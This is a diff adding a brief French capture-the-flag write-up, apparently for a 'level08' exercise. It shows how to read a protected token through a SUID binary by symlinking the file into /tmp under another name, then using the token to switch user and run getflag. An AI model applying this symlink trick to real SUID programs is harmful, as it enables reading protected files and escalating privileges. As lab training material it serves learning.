@@ -1,0 +1,21 @@
+level08 a les droits SUID
+avec un strings sur level08 on voit qu'il doit utiliser le fichier `token` present dans le meme repertoire
+level08 prend un parametre
+il faut donc qui level08 prenne token en parametre pour le lire
+->`You may not access`
+il ne peut pas y avaoir acces directement donc on doit creer un lien symbolique de `token` (token du user flag08) avec un fichier present dans /tmp
+unique endroit avec les droits:
+->ln -s ~/token /tmp/flag
+
+on peut verifier que notre lien est bien en place:
+->ls -l /tmp/flag
+
+ensuite on execute le script level08
+-> ./level08 /tmp/flag
+
+on obtient le token du user flag08:
+-> su flag08
+passwd = token
+
+pour pouvoir passer au niveau 09:
+-> getflag
